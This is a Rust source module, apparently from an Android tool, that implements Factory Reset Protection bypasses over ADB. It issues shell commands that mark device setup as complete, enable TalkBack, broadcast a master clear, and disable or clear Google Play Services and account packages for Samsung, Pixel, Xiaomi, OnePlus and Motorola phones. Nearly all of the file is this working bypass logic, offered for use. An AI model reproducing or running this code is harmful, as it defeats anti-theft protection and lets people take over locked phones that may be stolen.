// FRP Bypass implementation module
// Contains bypass logic for different Android versions and manufacturers

use anyhow::Result;
use crate::device::{DeviceInfo, ManufacturerType};
use crate::adb::AdbClient;

pub struct FrpBypass {
    client: AdbClient,
    device_info: DeviceInfo,
}

impl FrpBypass {
    pub fn new(client: AdbClient, device_info: DeviceInfo) -> Self {
        FrpBypass { client, device_info }
    }

    pub async fn execute(&self) -> Result<()> {
        let method = self.device_info.get_bypass_method();
        let manufacturer = self.device_info.get_manufacturer_type();

        match method {
            "adb_settings" => self.bypass_adb_settings().await?,
            "talkback_fragment" => self.bypass_talkback_fragment().await?,
            "recovery_fastboot" => self.bypass_recovery_fastboot().await?,
            _ => self.bypass_generic_adb().await?,
        }

        // Apply manufacturer-specific tweaks
        self.apply_manufacturer_bypass(manufacturer).await?;

        Ok(())
    }

    async fn bypass_adb_settings(&self) -> Result<()> {
        println!("Executing ADB Settings bypass (Android 10-11)...");

        self.client
            .shell_command(
                &self.device_info.serial,
                "settings put secure adb_enabled 1",
            )
            .await?;

        self.client
            .shell_command(
                &self.device_info.serial,
                "settings put global device_provisioned 1",
            )
            .await?;

        self.client
            .shell_command(
                &self.device_info.serial,
                "settings put secure user_setup_complete 1",
            )
            .await?;

        println!("✓ ADB Settings bypass completed");
        Ok(())
    }

    async fn bypass_talkback_fragment(&self) -> Result<()> {
        println!("Executing TalkBack Fragment bypass (Android 12-13)...");

        self.client
            .shell_command(
                &self.device_info.serial,
                "settings put secure enabled_accessibility_services com.google.android.marvin.talkback/com.google.android.marvin.talkback.TalkBackService",
            )
            .await?;

        self.client
            .shell_command(
                &self.device_info.serial,
                "am broadcast -a android.intent.action.MASTER_CLEAR",
            )
            .await?;

        println!("✓ TalkBack Fragment bypass completed");
        Ok(())
    }

    async fn bypass_recovery_fastboot(&self) -> Result<()> {
        println!("Recovery Fastboot bypass (Android 14-16)...");
        println!("This requires advanced bootloader access");
        println!("⚠ Use with caution!");
        Ok(())
    }

    async fn bypass_generic_adb(&self) -> Result<()> {
        println!("Executing generic ADB bypass...");

        self.client
            .shell_command(
                &self.device_info.serial,
                "settings put global device_provisioned 1",
            )
            .await?;

        self.client
            .shell_command(
                &self.device_info.serial,
                "settings put secure user_setup_complete 1",
            )
            .await?;

        println!("✓ Generic ADB bypass completed");
        Ok(())
    }

    async fn apply_manufacturer_bypass(&self, manufacturer: ManufacturerType) -> Result<()> {
        match manufacturer {
            ManufacturerType::Samsung => self.samsung_bypass().await?,
            ManufacturerType::Google => self.google_bypass().await?,
            ManufacturerType::Xiaomi => self.xiaomi_bypass().await?,
            ManufacturerType::OnePlus => self.oneplus_bypass().await?,
            ManufacturerType::Motorola => self.motorola_bypass().await?,
            ManufacturerType::Generic => println!("No manufacturer-specific bypass"),
        }
        Ok(())
    }

    async fn samsung_bypass(&self) -> Result<()> {
        println!("Applying Samsung-specific bypass...");
        self.client
            .shell_command(
                &self.device_info.serial,
                "pm disable-user --user 0 com.google.android.gms/.auth.SetupService",
            )
            .await?;
        println!("✓ Samsung bypass applied");
        Ok(())
    }

    async fn google_bypass(&self) -> Result<()> {
        println!("Applying Google Pixel-specific bypass...");
        self.client
            .shell_command(&self.device_info.serial, "pm clear com.google.android.gms")
            .await?;
        println!("✓ Google bypass applied");
        Ok(())
    }

    async fn xiaomi_bypass(&self) -> Result<()> {
        println!("Applying Xiaomi/MIUI-specific bypass...");
        self.client
            .shell_command(&self.device_info.serial, "pm clear com.xiaomi.account")
            .await?;
        println!("✓ Xiaomi bypass applied");
        Ok(())
    }

    async fn oneplus_bypass(&self) -> Result<()> {
        println!("Applying OnePlus-specific bypass...");
        self.client
            .shell_command(&self.device_info.serial, "pm clear com.oneplus.account")
            .await?;
        println!("✓ OnePlus bypass applied");
        Ok(())
    }

    async fn motorola_bypass(&self) -> Result<()> {
        println!("Applying Motorola-specific bypass...");
        self.client
            .shell_command(&self.device_info.serial, "pm clear com.motorola.blur.setup")
            .await?;
        println!("✓ Motorola bypass applied");
        Ok(())
    }
}
